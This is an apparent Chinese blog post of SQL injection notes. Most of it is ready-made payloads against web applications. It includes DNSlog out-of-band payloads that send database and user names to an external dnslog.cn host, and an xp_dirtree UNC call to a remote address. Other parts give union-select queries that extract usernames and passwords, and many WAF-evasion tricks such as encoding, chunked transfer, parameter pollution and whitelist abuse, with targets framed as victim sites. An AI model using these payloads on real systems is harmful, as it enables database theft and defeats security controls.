<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765539_62cf7ea3330691d8a8415.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
<h3 id="Dnslog对外注入"><a href="#Dnslog对外注入" class="headerlink" title="Dnslog对外注入"></a><strong>Dnslog对外注入</strong></h3><p>通常我们面对SQL注入过程中没有回显的情况下，只能通过盲注的方式来判断是否存在SQL注入，但是，使用盲注，手工测试是需要花费大量的时间的，可能会想到使用sqlmap直接去跑出数据，但在实际测试中，使用sqlmap跑盲注，有很大的几率，网站把ip给封掉，这就影响了我们的测试进度，也许你也可以使用代理池</p>
<p>注入语句：</p>
<p>?id&#x3D;1’ and (select load_file(concat(‘\‘,(select hex(user())),’.682y4b.dnslog.cn&#x2F;abc’))) –+</p>
<p>?id&#x3D;1’ and (select load_file(concat(‘\‘,(select database()),’.682y4b.dnslog.cn&#x2F;abc’))) –+</p>
<h3 id="中转注入"><a href="#中转注入" class="headerlink" title="中转注入"></a><strong>中转注入</strong></h3><p>比如受害者网站URL注入点是经过编码的，不能直接结合sqlmap进行漏洞利用，所以本地搭建一个网站，写一个php脚本编码文件，就可以结合sqlmap工具进行测试。</p>
<p>因为，注入点经过复杂编码之后，就不能直接结合sqlmap进行漏洞攻击了。或者sqlmap自己编写tamper脚本进行攻击</p>
<p>可参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40412037/article/details/110088186">https://blog.csdn.net/weixin_40412037/article/details/110088186</a></p>
<h3 id="搜索框注入"><a href="#搜索框注入" class="headerlink" title="搜索框注入"></a><strong>搜索框注入</strong></h3><p>注入payload：</p>
<p>%’ and ‘%1%’&#x3D;’%1</p>
<p>%’ and ‘%1%’&#x3D;’%2</p>
<p>Sql数据库语句：select * from sqltest where names like ‘%要查询的关键字%’</p>
<p>a%’ and 1&#x3D;1– 正常</p>
<p>a%’ and 1&#x3D;2– 错误</p>
<p>有搜索数据的框可以试试加个%总能大力出奇迹</p>
<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a><strong>宽字节注入</strong></h3><p>前提</p>
<p>1.使用了addslashes()函数</p>
<p>2.数据库设置了编码模式为GBK</p>
<p>原理：前端输入%df时，首先经过addslashes()转义变成%df%5c%27，之后，在数据库查询前，因为设置了GBK编码，GBK编码在汉字编码范围内的两个字节都会重新编码成一个汉字。然后mysql服务器会对查询的语句进行GBK编码，%df%5c编码成了“运”，而单引号逃逸了出来，形成了注入漏洞</p>
<p>?id&#x3D;%df’ and 1&#x3D;1 –+</p>
<p>?id&#x3D;%df’ and 1&#x3D;2 –+</p>
<p>?id&#x3D;-1%df’ union select 1,2,3 %23</p>
<h3 id="Cookie注入和Xff注入"><a href="#Cookie注入和Xff注入" class="headerlink" title="Cookie注入和Xff注入"></a><strong>Cookie注入和Xff注入</strong></h3><p>主要是看看程序员有没有在cookie中做了一些过滤，我们有没有可趁之机。</p>
<p>Cookie: ‘ order by 4–+</p>
<p>X-Forwarded-For注入</p>
<p>代表客户端真实的IP，通过修改X-Forwarded-for的值可以伪造客户端IP</p>
<p>尝试抓包添加插入X-Forwarded-For:127.0.0.1头进行sql注入</p>
<h3 id="Between注入"><a href="#Between注入" class="headerlink" title="Between注入"></a><strong>Between注入</strong></h3><p>主要用于盲注看页面是否有变化，原理如下，例如username的字符内容是test1，第一个字符是t，a到b搜索不了，页面不正常。 a到t就有了，页面正常</p>
<p>mysql语句： select * from users where id &#x3D;1 and substr(username,1,1) between ‘a’ and ‘b’;</p>
<p>select * from users where id &#x3D;1 and substr(username,1,1) between ‘a’ and ‘t’;</p>
<p>借鉴大佬图片：</p>
<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765568_62cf7ec07edc75bbb2cd0.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
<h3 id="limit注入"><a href="#limit注入" class="headerlink" title="limit注入"></a><strong>limit注入</strong></h3><p>mysql语句： select * from limit test limit 1,[可控点] or select … limit [可控点]</p>
<p>limit后面能够拼接的函数只有into和procedure，into可以用来写文件，本文我们不考虑。在Limit后面 可以用 procedure analyse()这个子查询，而且只能用extractvalue 和 benchmark 函数进行延时</p>
<p>procedure analyse(updatexml(rand(),concat(0x3a,benchmark(10000000,sha1(1)))),1)</p>
<p>select id from users;</p>
<p>select id from users limit 0,1 union select username from users;</p>
<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765587_62cf7ed363bca35f96495.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
<p>select field from user where id &gt;0 order by id limit 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</p>
<p>基于时间盲注：</p>
<p>SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</p>
<h3 id="order-by注入"><a href="#order-by注入" class="headerlink" title="order by注入"></a><strong>order by注入</strong></h3><p>select * from 表名 order by 列名(或者数字) asc；升序(默认升序)</p>
<p>select * from 表名 order by 列名(或者数字) desc；降序</p>
<p>当页面出现mysql报错信息时，注入点在 order by后面，此时可以利用报错信息进行注入，尝试报错注入</p>
<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765602_62cf7ee2335a18b91bc38.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
<p>?sort&#x3D;1 and(select extractvalue(0x7e,concat(0x7e,database(),0x7e)))</p>
<p>?sort&#x3D;(select 1 from(select 1 and if(ascii(substr((user()),1,1))&#x3D;114,sleep(5),1))x)</p>
<p><strong>Sql注入绕过姿势</strong></p>
<h3 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a><strong>绕过空格</strong></h3><p>两个空格代替一个空格，用Tab代替空格，%a0&#x3D;空格：</p>
<p>payload:</p>
<p>%20 %09 %0a %0b %0c %0d %a0 %00 &#x2F;**&#x2F; &#x2F;<em>!</em>&#x2F;</p>
<p>最基本的绕过方法，用注释替换空格： &#x2F;* 注释 *&#x2F;</p>
<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765618_62cf7ef2f3244c1249103.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
<p>括号绕过空格</p>
<p>mysql语句：select(user())from dual where(1&#x3D;1)and(2&#x3D;2)</p>
<p>这种过滤方法常常用于time based盲注,例如：</p>
<p>?id&#x3D;1%27and(sleep(ascii(mid(database()from(1)for(1)))&#x3D;109))%23</p>
<h3 id="绕过引号"><a href="#绕过引号" class="headerlink" title="绕过引号"></a><strong>绕过引号</strong></h3><p>这个时候如果引号被过滤了，那么上面的where子句就无法使用了。那么遇到这样的问题就要使用<strong>十六进制</strong>来处理这个问题了。users的十六进制的字符串是7573657273。那么最后的sql语句就变为了：</p>
<p>select column_name from information_schema.tables where table_name&#x3D;0x7573657273</p>
<h3 id="绕过逗号"><a href="#绕过逗号" class="headerlink" title="绕过逗号"></a><strong>绕过逗号</strong></h3><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决：</p>
<p>select substr(database() from 1 for 1);</p>
<p>select mid(database() from 1 for 1);</p>
<p>使用join：</p>
<p>union select 1,2#</p>
<p>等价于 union select * from (select 1)a join (select 2)b</p>
<p>使用like:</p>
<p>select ascii(mid(user(),1,1))&#x3D;80 #</p>
<p>等价于 select user() like ‘r%’</p>
<p>对于limit可以使用offset来绕过：</p>
<p>select * from news limit 0,1 #</p>
<p>等价于下面这条SQL语句 select * from news limit 1 offset 0</p>
<h3 id="绕过比较符号"><a href="#绕过比较符号" class="headerlink" title="绕过比较符号()"></a><strong>绕过比较符号()</strong></h3><p>（过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本）：</p>
<p>使用greatest()、least（）：（前者返回最大值，后者返回最小值）</p>
<p>同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了。 最常见的一个盲注的sql语句：</p>
<p>select * from users where id&#x3D;1 and ascii(substr(database(),0,1))&gt;64</p>
<p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。 那么上面的这条sql语句可以使用greatest变为如下的子句:</p>
<p>select * from users where id&#x3D;1 and greatest(ascii(substr(database(),0,1)),64)&#x3D;64</p>
<h3 id="Between注入-1"><a href="#Between注入-1" class="headerlink" title="Between注入"></a><strong>Between注入</strong></h3><p>主要用于盲注看页面是否有变化，原理如下，例如username的字符内容是test1，第一个字符是t，a到b搜索不了，页面不正常。 a到t就有了，页面正常</p>
<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765644_62cf7f0c4a9bf9f4e426d.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
<p>使用between and：</p>
<p>使用between and:</p>
<p>between a and b：</p>
<p>between 1 and 1; 等价于 &#x3D;1</p>
<h3 id="or-and-xor-not绕过："><a href="#or-and-xor-not绕过：" class="headerlink" title="or and xor not绕过："></a><strong>or and xor not绕过：</strong></h3><p>and&#x3D;&amp;&amp; or&#x3D;|| xor&#x3D;| not&#x3D;!</p>
<h3 id="绕过注释符"><a href="#绕过注释符" class="headerlink" title="绕过注释符"></a><strong>绕过注释符</strong></h3><p>（#，–(后面跟一个空格））过滤：</p>
<p>id&#x3D;1’ union select 1,2,3||’1</p>
<p>最后的or ‘1闭合查询语句的最后的单引号，或者：</p>
<p>id&#x3D;1’ union select 1,2,’3</p>
<h3 id="绕过等于号"><a href="#绕过等于号" class="headerlink" title="绕过等于号"></a><strong>绕过等于号</strong></h3><p>使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;</p>
<h3 id="绕过union，select，where等："><a href="#绕过union，select，where等：" class="headerlink" title="绕过union，select，where等："></a><strong>绕过union，select，where等：</strong></h3><p>（1）使用注释符绕过：</p>
<p>常用注释符：&#x2F;&#x2F;，– , &#x2F;**&#x2F;, #, –+, – -, ;,%00,–a</p>
<p>用法：U&#x2F;<strong>&#x2F; NION &#x2F;</strong>&#x2F; SE&#x2F;<strong>&#x2F; LECT &#x2F;</strong>&#x2F;user，pwd from user</p>
<p>（2）使用大小写绕过：</p>
<p>id&#x3D;-1’UnIoN&#x2F;**&#x2F;SeLeCT</p>
<p>（3）内联注释绕过：</p>
<p>id&#x3D;-1’&#x2F;<em>!UnIoN</em>&#x2F; SeLeCT 1,2,concat(&#x2F;<em>!table_name</em>&#x2F;) FrOM &#x2F;<em>information_schema</em>&#x2F;.tables &#x2F;<em>!WHERE &#x2F;&#x2F;!TaBlE_ScHeMa</em>&#x2F; like database()#</p>
<p>（4） 双关键字绕过（若删除掉第一个匹配的union就能绕过）：</p>
<p>id&#x3D;-1’UNIunionONSeLselectECT1,2,3–-</p>
<p><strong>Sql注入Bypass</strong></p>
<h3 id="WAF绕过-应用层"><a href="#WAF绕过-应用层" class="headerlink" title="WAF绕过-应用层"></a><strong>WAF绕过-应用层</strong></h3><p>Sql绕过姿势：<a target="_blank" rel="noopener" href="https://www.csdn.net/tags/MtTaEgwsMTU4NzM1LWJsb2cO0O0O.html">https://www.csdn.net/tags/MtTaEgwsMTU4NzM1LWJsb2cO0O0O.html</a></p>
<h4 id="大小写-关键字替换"><a href="#大小写-关键字替换" class="headerlink" title="大小写&#x2F;关键字替换"></a>大小写&#x2F;关键字替换</h4><ul>
<li><p>id&#x3D;1UnIoN&#x2F;**&#x2F;SeLeCT1,user()</p>
</li>
<li><p>Hex() bin() 等价于 ascii()</p>
</li>
<li><p>Sleep() 等价于 benchmark()</p>
</li>
<li><p>Mid() substring() 等价于substr()</p>
</li>
<li><p>@@user 等价于 User()</p>
</li>
<li><p>@@Version 等价于 version()</p>
</li>
</ul>
<p>绕过：</p>
<p>AND -&gt; &amp;&amp;</p>
<p>OR -&gt; || &#x2F; ^</p>
<p>= -&gt; LIKE,REGEXP, BETWEEN, not &lt; and not &gt;，!&lt;&gt;</p>
<p>&gt; X -&gt; not between 0 and X</p>
<p>WHERE -&gt; HAVING</p>
<p>手工盲注 1’||ascii(substr(database(),2,1))&gt;&#x3D;’120</p>
<h4 id="各种编码"><a href="#各种编码" class="headerlink" title="各种编码"></a>各种编码</h4><p>大小写，URL，hex，%0A等</p>
<h4 id="注释使用"><a href="#注释使用" class="headerlink" title="注释使用"></a>注释使用</h4><p>&#x2F;&#x2F;—-+#&#x2F;&#x2F;+:%00&#x2F;!&#x2F;等</p>
<h4 id="再次循环"><a href="#再次循环" class="headerlink" title="再次循环"></a>再次循环</h4><p>union&#x3D;&#x3D;uunionnion</p>
<h4 id="分块传输"><a href="#分块传输" class="headerlink" title="分块传输"></a>分块传输</h4><p>比如在burp抓包时，存在Post请求的注入，如id&#x3D;1’ and 1&#x3D;2#</p>
<p>尝试分块传输</p>
<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765719_62cf7f578b907ecc13fdc.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
<p>进行分块传输的时候，请求头要加上<strong>Transfer-Encoding: Chunked</strong>，然后POST的数据规则如下</p>
<p>2 #下面的数据的长度，可以在后面加个分号然后添加注释（2; hello world） id #请求的参数 2 #下面的数据的长度 &#x3D;1 #请求的值，和前面的id连起来 0 #表明分块请求结束，一个0和两个换行</p>
<p>最后就是大佬写出的插件，安装了一键分块Orz<br><a target="_blank" rel="noopener" href="https://github.com/c0ny1/chunked-coding-converter">https://github.com/c0ny1/chunked-coding-converter</a></p>
<h4 id="等价替换"><a href="#等价替换" class="headerlink" title="等价替换"></a>等价替换</h4><p>hex()、bin() &#x3D;&#x3D;&gt; ascii()<br>sleep() &#x3D;&#x3D;&gt;benchmark()<br>concat_ws()&#x3D;&#x3D;&gt;group_concat()<br>mid()、substr() &#x3D;&#x3D;&gt; substring()<br>@@user &#x3D;&#x3D;&gt; user()<br>@@datadir &#x3D;&#x3D;&gt; datadir()<br>举例：substring()和substr()无法使用时：?id&#x3D;1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))&#x3D;74　<br>或者：<br>substr((select ‘password’),1,1) &#x3D; 0x70<br>strcmp(left(‘password’,1), 0x69) &#x3D; 1<br>strcmp(left(‘password’,1), 0x70) &#x3D; 0<br>strcmp(left(‘password’,1), 0x71) &#x3D; -1</p>
<h4 id="参数污染"><a href="#参数污染" class="headerlink" title="参数污染"></a>参数污染</h4><p>?id&#x3D;1&amp;id&#x3D;2&amp;id&#x3D;3</p>
<h4 id="编码解码及加密解密"><a href="#编码解码及加密解密" class="headerlink" title="编码解码及加密解密"></a>编码解码及加密解密</h4><ul>
<li><p>s-&gt;%73-&gt;%25%37%33</p>
</li>
<li><p>hex,unlcode,base64等</p>
</li>
</ul>
<h4 id="更改请求提交方式"><a href="#更改请求提交方式" class="headerlink" title="更改请求提交方式"></a>更改请求提交方式</h4><p>尝试更改Get请求为Post请求</p>
<ul>
<li><p>GET POST COOKIE等</p>
</li>
<li><p>POST-&gt;multipart&#x2F;form-data</p>
</li>
</ul>
<h4 id="中间件HPP-HTTP参数污染"><a href="#中间件HPP-HTTP参数污染" class="headerlink" title="中间件HPP(HTTP参数污染)"></a>中间件HPP(HTTP参数污染)</h4><p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765734_62cf7f6657d4c137788e0.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
<p><strong>HPP</strong>是HTTP Parameter Pollution的缩写，意为HTTP参数污染。</p>
<ul>
<li><p>原理：浏览器在跟服务器进行交互的过程中，浏览器往往会在GET&#x2F;POST请求里面带上参数，这些参数会以 名称-值 对的形势出现，通常在一个请求中，同样名称的参数只会出现一次。但是在HTTP协议中是允许同样名称的参数出现多次的。比如下面这个链接：<a target="_blank" rel="noopener" href="http://www.baidu.com/?name=aa&amp;name=bb">http://www.baidu.com?name=aa&amp;name=bb</a>，针对同样名称的参数出现多次的情况，不同的服务器的处理方式会不一样。有的服务器是取第一个参数，也就是name&#x3D;aa。有的服务器是取第二个参数，也就是name&#x3D;bb。有的服务器两个参数都取，也就是name&#x3D;aa,bb 。这种特性在绕过一些服务器端的逻辑判断时，非常有用。</p>
</li>
<li><p>HPP漏洞，与Web服务器环境、服务端使用的脚本有关。如下是不同Web服务器对于出现多个参数时的选择</p>
</li>
<li><p>通过HPP接管账户,当网站开发者不熟悉Web服务器对于多参数时如何选择，将给攻击者可乘之机。HPP能针对客户端和服务端进行攻击。</p>
</li>
<li><p>HPP参数污染还可以用于绕过某些防火墙对于 SQL注入的检测，例如当Web服务器对多参数都同时选择时，我们可以用以下这种方式绕过某些防火墙：</p>
<pre><code class="hljs">http://www.test.com/index.asp?page=select 1,2,3 from table where id=1  
http://www.test.com/index.asp?page=select 1&amp;page=2,3 from table where id=1
</code></pre>
</li>
</ul>
<p>HTTP参数污染是指当同一参数出现多次，不同的中间件会解析为不同的结果,以参数color&#x3D;red&amp;color&#x3D;blue为例</p>
<h3 id="WAF绕过-数据库特性"><a href="#WAF绕过-数据库特性" class="headerlink" title="WAF绕过-数据库特性"></a><strong>WAF绕过-数据库特性</strong></h3><p>mysql注释符有三种</p>
<ul>
<li>#,&#x2F;…&#x2F;,–…(注意–后面有一个空格，或者为–+)</li>
</ul>
<p>空格符</p>
<ul>
<li>0x09,0x0a-0x0d,0x20,0xa0</li>
</ul>
<p>特殊符号：%a换行符</p>
<ul>
<li>可结合注释符使用%23%0a,%2d%2d%0a</li>
</ul>
<p>内联注释</p>
<ul>
<li>&#x2F;!UnIon12345SelEcT&#x2F;1,user(),数字范围1000-50540</li>
</ul>
<p>mysql黑魔法</p>
<ul>
<li>select{xusername}from{x11test.admin};</li>
</ul>
<h3 id="WAF绕过-逻辑层"><a href="#WAF绕过-逻辑层" class="headerlink" title="WAF绕过-逻辑层"></a><strong>WAF绕过-逻辑层</strong></h3><p>逻辑问题</p>
<ol>
<li><p>云waf防护，一般我们会尝试通过查找站点的真实IP，从而绕过CDN防护。</p>
</li>
<li><p>当提交GET、POST同时请求时，进入POST逻辑，而忽略了GET请求的有害参数输入,可尝试Bypass。</p>
</li>
<li><p>HTTP和HTTPS同时开放服务，没有做HTTP到HTTPS的强制跳转，导致HTTPS有WAF防护，HTTP没有防护，直接访问HTTP站点绕过防护。</p>
</li>
<li><p>特殊符号%00，部分waf遇到%00截断，只能获取到前面的参数，无法获取到后面的有害参数输入，从而导致Bypass。比如：id&#x3D;1 %00 and 1&#x3D;2 union select 1,2,column_name from information_schema.columns</p>
</li>
</ol>
<p>性能问题</p>
<ul>
<li><p>猜想1：在设计WAF系统时，考虑自身性能问题，当数据量达到一定层级，不检测这部分数据。只要不断的填充数据，当数据达到一定数目之后，恶意代码就不会被检测了。</p>
</li>
<li><p>猜想2：不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度就会引发bug，从而实现绕过。</p>
</li>
</ul>
<p>例子1：</p>
<p>?id&#x3D;1and(select1)&#x3D;(Select0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9</p>
<ul>
<li>0xA*1000指0xA后面A重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考也许在有些情况下可能不需要这么长也能溢出。</li>
</ul>
<p>例子2：</p>
<p>?a0&#x3D;0&amp;a1&#x3D;1&amp;…..&amp;a100&#x3D;100&amp;id&#x3D;1<br>union<br>select<br>1,schema_name,3<br>from<br>INFORMATION_SCHEMA.schemata</p>
<ul>
<li>获取请求参数，只获取前100个参数，第101个参数并没有获取到，导致SQL注入绕过。</li>
</ul>
<p>白名单</p>
<ul>
<li><p>方式一：IP白名单</p>
</li>
<li><p>从网络层获取的ip，这种一般伪造不来，如果是获取客户端的IP，这样就可能存在伪造IP绕过的情况。测试方法：修改http的header来bypasswaf</p>
</li>
</ul>
<p>X-forwarded-for<br>X-remote-IP<br>X-originating-IP<br>x-remote-addr<br>X-Real-ip</p>
<p>方式二：静态资源</p>
<ul>
<li><p>特定的静态资源后缀请求，常见的静态文件(.js.jpg.swf.css等等)，类似白名单机制，waf为了检测效率，不去检测这样一些静态文件名后缀的请求。</p>
</li>
<li><p>Aspx&#x2F;php只识别到前面的.aspx&#x2F;.php后面基本不识别</p>
<pre><code class="hljs">http://10.9.9.201/sql.php?id=1  
http://10.9.9.201/sql.php/1.js?id=1
</code></pre>
</li>
</ul>
<p>方式三：url白名单</p>
<ul>
<li>为了防止误拦，部分waf内置默认的白名单列表，如admin&#x2F;manager&#x2F;system等管理后台。只要url中存在白名单的字符串，就作为白名单不进行检测。常见的url构造姿势</li>
</ul>
<p>学习文章：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/gjEPi8DKVsfGyEv8fnzY3Q">https://mp.weixin.qq.com/s/gjEPi8DKVsfGyEv8fnzY3Q</a></p>
<p><strong>Sqlserver注入（mssql）</strong></p>
<p><strong>SQL Server</strong>数据库是由Microsoft开发和推广的关系数据库管理系统(DBMS)，是一个比较大型的数据库。端口号为 <strong>1433</strong>。数据库后缀名 .mdf，注释符是 – 。延时命令：WAITFOR DELAY ‘0:0:2’</p>
<p><strong>SQLServer有三个权限级别：</strong></p>
<ul>
<li><p>sa权限：数据库操作，文件管理，命令执行，注册表读取等system。SQLServer数据库的最高权限</p>
</li>
<li><p>db权限：文件管理，数据库操作等权限 users-administrators</p>
</li>
<li><p>public权限：数据库操作 guest-users</p>
</li>
</ul>
<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765752_62cf7f787d9033b77f774.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
<p>判断是否是SA权限(数据库操作、文件管理、命令执行、注册表读取)</p>
<ol>
<li>select is_srvrolemember(‘sysadmin’)</li>
</ol>
<p>判断是否是db_owner权限 (数据库操作、文件管理)</p>
<ol>
<li>select is_member(‘db_owner’)</li>
</ol>
<p>判断是否是public权限 (数据库操作)</p>
<ol>
<li>select is_srvrolemember(‘public’)</li>
</ol>
<p>SQLServer数据库有6个默认的库，分别是4个系统数据库：master 、model 、msdb 、tempdb，和2个实例数据库：ReportServer、ReportServerTempDB。其中，系统数据库 model 和 tempdb 默认是没有数据表的。</p>
<p>附上payload：</p>
<pre><code class="hljs">    select @@version; #查询数据库的版本

    select @@servername; #查询服务名

    select host_name(); #查询主机名，如果是用navicat远程连接的话，主机名是本地的名字

    select db_name(); #查询当前数据库名

    select db_name(1); #查询第一个数据库名

    select db_name(2); #查询第二个数据库名

    select user; #查询当前数据库的拥有者，结果为 dbo。dbo是每个数据库的默认用户，具有所有者权限，全称：datebaseOwner ，即DbOwner

    use tempdb #切换到tempdb表

    top n #查询前n条记录

    limit 2,3 #查询第2条开始的3条数据，也就是2,3,4

    select substring(&#39;string&#39;,2,1) #截取给定字符串的索引为2的1个字符

    select ascii(&#39;a&#39;) #查询给定字符串的ascii值

    select len(&#39;string&#39;) #查询给定字符串的长度

    EXEC sp_spaceused @updateusage = N&#39;TRUE&#39;; #查询当前数据库的大小

    sp_spaceused &#39;表名&#39; #查询指定表名的大小

    EXEC master.sys.xp_dirtree &#39;\\192.168.106.5\\xx.txt&#39;,0,1;

    判断是否是SA权限

    select is_srvrolemember(&#39;sysadmin&#39;)

    判断是否是db_owner权限

    select is_member(&#39;db_owner&#39;)

    判断是否是public权限

    select is_srvrolemember(&#39;public&#39;)
</code></pre>
<h3 id="普通注入-1"><a href="#普通注入-1" class="headerlink" title="普通注入"></a><strong>普通注入</strong></h3><p>order by 2 成功；order by 3 失败； order by 4 成功；order by 5 失败 说明列数位于 3-4之间。查找回显点</p>
<p>id&#x3D;2 and 1&#x3D;2 union all select null,null,null,null；挨个替换null 发现 select null,2,null,null 页面出现回显。</p>
<p>查找所在库名称添加： ?id&#x3D;2 and 1&#x3D;2 union all select 1,(select db_name()), ‘3’, 4</p>
<p>找到数据库名称。 提示：这里也可以使用db_name(1)、db_name(2)等查询其他数据</p>
<p>查找数据库表名称：?id&#x3D;2 and 1&#x3D;2 union all select 1,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype &#x3D; ‘U’),’3’,4提示: xtype&#x3D;’U’ 为 用户表</p>
<p>?id&#x3D;2 and 1&#x3D;2 union all select 1,(select top 1 col_name(object_id(‘manage’),1) from sysobjects),’3’,4替换 col_name(object_id(‘manage’),1) 中的1 依次为 2，3，4查出所有列名。</p>
<p>查取数据: ?id&#x3D;2 and 1&#x3D;2 union all select 1,(select top 1 username from manage),’3’,4 获取用户名；</p>
<p>?id&#x3D;2 and 1&#x3D;2 union all select 1,(select top 1 password from manage),’3’,4 获取密码</p>
<h2 id="全回显操作"><a href="#全回显操作" class="headerlink" title="全回显操作"></a><strong>全回显操作</strong></h2><p>获取当前数据库中的表（有2个语句可供选择使用）【下列语句可一次爆数据库所有表（只限于mssql2005及以上版本）】</p>
<p>(select quotename(name) from 数据库名..sysobjects where xtype&#x3D;’U’ FOR XML PATH(‘’))–</p>
<p>(select ‘|’%2bname%2b’|’ from 数据库名..sysobjects where xtype&#x3D;’U’ FOR XML PATH(‘’))–</p>
<p>案例： mozhe_dbv2是数据库名字</p>
<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765776_62cf7f9087fb6626ca007.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
<p>一次爆指定表的所有列（只限于mssql2005及以上版本）：</p>
<p>(select quotename(name) from 数据库名..syscolumns where id &#x3D;(select id from 数据库名..sysobjects where name&#x3D;’指定表名’) FOR XML PATH(‘’))–</p>
<p>(select ‘|’%2bname%2b’|’ from 数据库名..syscolumns where id &#x3D;(select id from 数据库名..sysobjects where name&#x3D;’指定表名’) FOR XML PATH(‘’))—</p>
<p>案例： mange是表名  
 </p>
<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E6%B5%85%E8%B0%88Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/1657765789_62cf7f9d50b3e1805fb70.png" srcset="/img/loading.gif" lazyload alt="alt text"></p>
<h3 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a><strong>报错注入</strong></h3><p>and 1&#x3D;(select @@VERSION) &#x2F;&#x2F;<strong>MSSQL</strong>版本</p>
<p>And 1&#x3D;(select db_name()) &#x2F;&#x2F;当前数据库名</p>
<p>and 1&#x3D;(select @@servername) &#x2F;&#x2F;本地服务名</p>
<p>and 1&#x3D;(select IS_SRVROLEMEMBER(‘sysadmin’)) &#x2F;&#x2F;判断是否是系统管理员sa</p>
<p>常用权限：sysadmin、serveradmin、setupadmin、securityadmin、diskadmin、bulkadmin</p>
<p>and 1&#x3D;(Select IS_MEMBER(‘db_owner’)) &#x2F;&#x2F;判断是否是库权限dbo</p>
<p>and 1&#x3D; (Select HAS_DBACCESS(‘master’)) &#x2F;&#x2F;判断是否有库读取权限</p>
<h3 id="2-单个爆破："><a href="#2-单个爆破：" class="headerlink" title="(2)单个爆破："></a><strong>(2)单个爆破：</strong></h3><p>and 1&#x3D;convert(int,(select top 1 table_name from information_schema.tables ))—获取第一个表名</p>
